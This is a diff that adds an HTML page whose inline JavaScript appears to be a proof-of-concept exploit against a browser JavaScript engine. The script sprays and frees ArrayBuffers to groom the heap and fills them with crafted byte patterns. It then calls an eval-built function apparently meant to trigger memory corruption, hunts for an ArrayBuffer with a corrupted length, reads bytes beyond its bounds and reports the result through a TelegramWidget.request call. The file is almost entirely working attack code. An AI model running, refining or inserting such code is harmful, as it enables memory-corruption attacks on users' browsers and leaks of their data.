@@ -1,0 +1,25 @@
+<!doctype html><meta charset="utf-8"><div id="v">loading</div><script>function mkf() {
+  return (0, eval)('"use strict"; globalThis.f = function ([] = eval("[]")) { var q1 = 0, q2 = 0, q3 = 0; return 1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5; };');
+}
+var NT = 1200, N = 1400, B = 2560, OFF = 0, QQ = 1;
+var P = new Array(N);
+for (var i = 0; i < N; i++) P[i] = new ArrayBuffer(B);
+for (var i = 0; i < N; i++) P[i] = null;
+mkf();
+var A = new Array(N), UV = new Array(N);
+for (var i = 0; i < N; i++) A[i] = new ArrayBuffer(B);
+for (var i = 0; i < N; i++) UV[i] = new Uint8Array(A[i]);
+var T = new Array(NT);
+for (var i = 0; i < NT; i++) T[i] = new ArrayBuffer(64);
+for (var h = 0; h < NT; h += 2) T[h] = null;
+var PB = new Uint8Array(B);
+var RT = [-1,-1,-1,-1, 5,0,0,0, 4,0,0,0, 4,0,0,0, 4,0,0,0];
+var RJ = [-1,-1,-1,-1, 5,0,0,0, 255,255,0,0, 4,0,0,0, 4,0,0,0];
+for (var o = OFF; o + 40 <= B; o += 40) { for (var k = 0; k < 20; k++) { PB[o+k] = (QQ ? RJ[k] : RT[k]); PB[o+20+k] = (QQ ? RT[k] : RJ[k]); } }
+for (var i = 0; i < N; i++) UV[i].set(PB);
+var out = "none";
+try { f(); } catch (e) { out = "threw"; }
+for (var i = 0; i < T.length; i++) { if (T[i] !== null && T[i].byteLength !== 64) { var hx = ""; try { var V = new Uint8Array(T[i]); for (var j = 0; j < 8; j++) hx += ("0" + V[64 + j].toString(16)).slice(-2); } catch (e) { hx = "err"; } out = i + ":" + T[i].byteLength + ":" + hx; break; } }
+try { if (typeof TelegramWidget !== "undefined" && TelegramWidget.request) { var p = TelegramWidget.request(("L34 " + out).slice(0, 60)); if (p && p.then) p.then(function(){}, function(){}); } } catch (e) {}
+("L34 " + out);
+</script>
